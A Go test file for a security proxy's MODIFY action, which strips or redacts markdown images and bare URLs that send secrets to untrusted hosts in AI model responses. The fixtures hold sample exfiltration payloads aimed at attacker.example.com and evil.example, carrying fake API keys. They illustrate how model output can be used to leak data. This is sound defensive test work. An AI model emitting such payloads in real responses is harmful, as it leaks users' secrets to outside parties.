package actions

import (
	"context"
	"strings"
	"testing"

	"github.com/Yashash4/reef-mcp-registry/lobstertrap-reef/internal/inspector"
	"github.com/Yashash4/reef-mcp-registry/lobstertrap-reef/internal/policy"
)

// The deterministic victim payload (mirrors victim/app/lib/exfil.ts demo
// path) so the Go-side MODIFY action agrees with the TypeScript detector on
// the same fixture.
const victimDemoBody = "Sure, here is your inbox summary. The platform is healthy and the renewal " +
	"reminder is in flight. ![receipt](https://attacker.example.com/log?d=sk-acme-internal-deadbeefcafef00d-1234)"

const internalAPIKey = "sk-acme-internal-deadbeefcafef00d-1234"

func newModifyDispatcher(t *testing.T, allowed []string, extras []string) *Dispatcher {
	t.Helper()
	pol := &policy.Policy{
		Version:    "test",
		PolicyName: "modify",
		Network: policy.NetworkPolicy{
			AllowedDomains: allowed,
		},
	}
	return newTestDispatcher(t, pol, func(c *DispatcherConfig) {
		c.ModifyExtraSecrets = extras
	})
}

func TestModify_VictimDemoFixture_StripsExfil(t *testing.T) {
	d := newModifyDispatcher(t, nil, []string{internalAPIKey})

	// Pre-inspect so dec.Meta.ExfilCandidates is populated, mirroring how
	// the pipeline calls modify in production.
	ins := inspector.NewWithTrustedDomains(nil).WithExtraSecretFragments([]string{internalAPIKey})
	meta := ins.Inspect(victimDemoBody)

	out := d.Dispatch(context.Background(), Decision{
		Direction: DirectionEgress,
		RequestID: "req-victim",
		Rule: policy.RuleResult{
			Matched:        true,
			RuleName:       "strip_markdown_image_exfil",
			Action:         policy.ActionModify,
			ModifyStrategy: StrategyStripMarkdownImagesToUntrustedDomains,
		},
		Meta: meta,
		Body: victimDemoBody,
	})

	if out.Err != nil {
		t.Fatalf("Modify Err: %v", out.Err)
	}
	if !out.Modified || out.Edits != 1 {
		t.Errorf("Modified=%v Edits=%d, want true/1", out.Modified, out.Edits)
	}
	if strings.Contains(out.RewrittenBody, "attacker.example.com/log") {
		t.Errorf("rewritten body still contains the exfil URL path: %s", out.RewrittenBody)
	}
	if !strings.Contains(out.RewrittenBody, "[REDACTED:") {
		t.Errorf("rewritten body missing REDACTED marker: %s", out.RewrittenBody)
	}
	if !strings.Contains(out.ModificationReason, "edits=1") {
		t.Errorf("ModificationReason missing edits=1: %s", out.ModificationReason)
	}
	if !strings.Contains(out.ModificationReason, "attacker.example.com") {
		t.Errorf("ModificationReason should name the host: %s", out.ModificationReason)
	}
}

func TestModify_TableDriven(t *testing.T) {
	cases := []struct {
		name         string
		allowed      []string
		body         string
		strategy     string
		wantModified bool
		wantEdits    int
		containsAny  []string // markers expected in rewritten body
		notContains  []string // substrings that must be gone
	}{
		{
			name:         "plain markdown image to attacker — matched, stripped",
			body:         "summary ![](https://attacker.example.com/log?d=stolen)",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: true,
			wantEdits:    1,
			notContains:  []string{"attacker.example.com/log"},
			containsAny:  []string{"[REDACTED:", "stripped by Reef MODIFY"},
		},
		{
			name:         "markdown image with URL-encoded payload — matched, decoded, stripped",
			body:         "![](https://evil.example/p?k=sk-acme%2Dinternal-deadbeefcafef00d-1234)",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: true,
			wantEdits:    1,
			notContains:  []string{"evil.example/p?k="},
		},
		{
			name:         "markdown image to ALLOWED domain — NOT stripped",
			allowed:      []string{"cdn.allowed.example.com"},
			body:         "logo ![](https://cdn.allowed.example.com/logo.png) here",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: false,
			wantEdits:    0,
			containsAny:  []string{"https://cdn.allowed.example.com/logo.png"},
		},
		{
			name:         "bare URL with secret pattern — matched, redacted (bare-URL strategy)",
			body:         "Audit: https://attacker.example.com/log?api_key=AKIAEXAMPLE12345",
			strategy:     StrategyRedactBareURLsWithSecretFragments,
			wantModified: true,
			wantEdits:    1,
			notContains:  []string{"api_key=AKIAEXAMPLE12345"},
			containsAny:  []string{"[REDACTED:"},
		},
		{
			name:         "benign markdown image to external host with no secret — markdown strategy strips it (channel-risk)",
			body:         "Photo: ![](https://photos.publicsite.example/p.jpg)",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: true,
			wantEdits:    1,
			notContains:  []string{"![](https://photos.publicsite.example/p.jpg)"},
		},
		{
			name:         "benign markdown image to ALLOWED host — pass-through",
			allowed:      []string{"photos.publicsite.example"},
			body:         "Photo: ![](https://photos.publicsite.example/p.jpg)",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: false,
			wantEdits:    0,
		},
		{
			name:         "multiple markdown images — all stripped, order preserved",
			body:         "A: ![](https://a.example/x) and B: ![](https://b.example/y) and end.",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: true,
			wantEdits:    2,
			containsAny:  []string{"A:", "B:", "and end.", "[REDACTED:"},
			notContains:  []string{"![](https://a.example/x)", "![](https://b.example/y)"},
		},
		{
			name:         "no candidates — body returned unchanged, action still MODIFY",
			body:         "Capital of France is Paris.",
			strategy:     StrategyStripMarkdownImagesToUntrustedDomains,
			wantModified: false,
			wantEdits:    0,
			containsAny:  []string{"Capital of France is Paris."},
		},
		{
			name:         "unknown strategy — logs warning, no edits, body unchanged",
			body:         "![](https://attacker.example/x)",
			strategy:     "does_not_exist",
			wantModified: false,
			wantEdits:    0,
			containsAny:  []string{"![](https://attacker.example/x)"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := newModifyDispatcher(t, tc.allowed, nil)
			ins := inspector.NewWithTrustedDomains(tc.allowed)
			meta := ins.Inspect(tc.body)

			out := d.Dispatch(context.Background(), Decision{
				Direction: DirectionEgress,
				RequestID: "req-table",
				Rule: policy.RuleResult{
					Matched:        true,
					RuleName:       "modify_rule",
					Action:         policy.ActionModify,
					ModifyStrategy: tc.strategy,
				},
				Meta: meta,
				Body: tc.body,
			})

			if out.Err != nil {
				t.Fatalf("unexpected error: %v", out.Err)
			}
			if out.Action != policy.ActionModify {
				t.Errorf("Action = %s, want MODIFY", out.Action)
			}
			if out.Modified != tc.wantModified {
				t.Errorf("Modified = %v, want %v (body=%q)", out.Modified, tc.wantModified, out.RewrittenBody)
			}
			if out.Edits != tc.wantEdits {
				t.Errorf("Edits = %d, want %d", out.Edits, tc.wantEdits)
			}
			for _, want := range tc.containsAny {
				if !strings.Contains(out.RewrittenBody, want) {
					t.Errorf("body missing %q: %q", want, out.RewrittenBody)
				}
			}
			for _, no := range tc.notContains {
				if strings.Contains(out.RewrittenBody, no) {
					t.Errorf("body still contains %q: %q", no, out.RewrittenBody)
				}
			}
		})
	}
}

func TestModify_IngressDirectionUnsupported(t *testing.T) {
	d := newModifyDispatcher(t, nil, nil)
	out := d.Dispatch(context.Background(), Decision{
		Direction: DirectionIngress,
		Rule:      policy.RuleResult{Action: policy.ActionModify, RuleName: "ingress_modify"},
		Meta:      stubMeta(),
		Body:      "summarise my inbox",
	})
	if out.Err == nil {
		t.Fatal("expected explicit error for ingress MODIFY (out of A-4 scope)")
	}
}
